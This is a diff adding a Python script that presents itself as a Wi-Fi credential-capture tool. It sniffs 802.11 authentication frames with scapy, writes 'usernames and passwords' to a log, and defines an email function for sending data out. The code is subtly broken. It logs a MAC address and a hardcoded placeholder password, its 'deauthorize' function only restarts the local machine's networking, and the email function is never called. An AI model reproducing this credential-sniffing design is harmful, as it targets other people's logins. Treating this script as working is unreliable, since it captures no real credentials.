@@ -1,0 +1,43 @@
+import os
+import smtplib
+import logging
+from datetime import datetime
+from scapy.all import *
+
+# Configure logging
+logging.basicConfig(filename='login_attempts.log', level=logging.INFO)
+
+# Function to log credentials
+def log_credentials(username, password):
+    logging.info(f"{datetime.now()} - Username: {username}, Password: {password}")
+
+# Function to send email
+def send_email(subject, body, to_email):
+    from_email = "your_email@example.com"
+    password = "your_email_password"
+    
+    with smtplib.SMTP('smtp.example.com', 587) as server:
+        server.starttls()
+        server.login(from_email, password)
+        message = f'Subject: {subject}\n\n{body}'
+        server.sendmail(from_email, to_email, message)
+
+# Function to deauthorize wireless connections
+def deauthorize_connections():
+    os.system("nmcli networking off")
+    os.system("nmcli networking on")
+
+# Function to capture login attempts
+def packet_handler(packet):
+    if packet.haslayer(Dot11Auth):
+        username = packet[Dot11Auth].addr1  # Example placeholder
+        password = "example_password"  # Example placeholder
+        log_credentials(username, password)
+
+# Main function
+def main():
+    deauthorize_connections()
+    sniff(iface="wlan0", prn=packet_handler)
+
+if __name__ == "__main__":
+    main()
